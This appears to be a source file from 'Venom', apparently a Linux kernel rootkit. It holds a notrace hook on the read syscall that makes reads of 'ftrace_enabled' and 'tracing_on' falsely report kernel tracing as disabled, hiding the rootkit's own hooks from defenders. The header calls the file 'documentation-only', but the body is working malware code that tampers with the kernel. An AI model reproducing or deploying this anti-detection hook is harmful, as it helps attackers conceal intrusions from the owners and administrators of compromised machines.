/*
 * Venom 
 * ---------------------------------------------------------------------------
 * File: read.c
 *
 * Purpose:
 *  - High-level notes on the read(2) syscall path and how interception or
 *    sanitisation of reads can change host-observable behavior (files,
 *    /proc, sockets, pipes).
 *
 * Contents (documentation-only):
 *  - Hooks read syscalls to prevent ftrace bypasses
 * 
 * Author: Trevohack 
 */



#ifndef READ_H
#define READ_H

#include "../include/headers.h"

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
static int spoof_next_read = 0;


notrace static asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    int fd = regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;
    
    file = fget(fd);
    if (file) {
        if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
            const char *name = file->f_path.dentry->d_name.name;
            
            if (strcmp(name, "ftrace_enabled") == 0 || 
                strcmp(name, "tracing_on") == 0) {
                
                fput(file);
                
                bytes_read = orig_read(regs);
                if (bytes_read <= 0) {
                    return bytes_read;
                }
                
                kernel_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
                if (!kernel_buf) {
                    return bytes_read;
                }
                
                if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                    kfree(kernel_buf);
                    return bytes_read;
                }
                
                if (spoof_next_read == 0 && bytes_read > 0 && kernel_buf[0] == '1') {
                    kernel_buf[0] = '0';
                    spoof_next_read = 1;
                    // printk(KERN_DEBUG "[VENOM] Spoofed ftrace status read\n");
                } else {
                    spoof_next_read = 0;
                }
                
                if (copy_to_user(user_buf, kernel_buf, bytes_read)) {
                    kfree(kernel_buf);
                    return -EFAULT;
                }
                
                kfree(kernel_buf);
                return bytes_read;
            }
        }
        fput(file);
    }
    
    return orig_read(regs);
}

#endif 

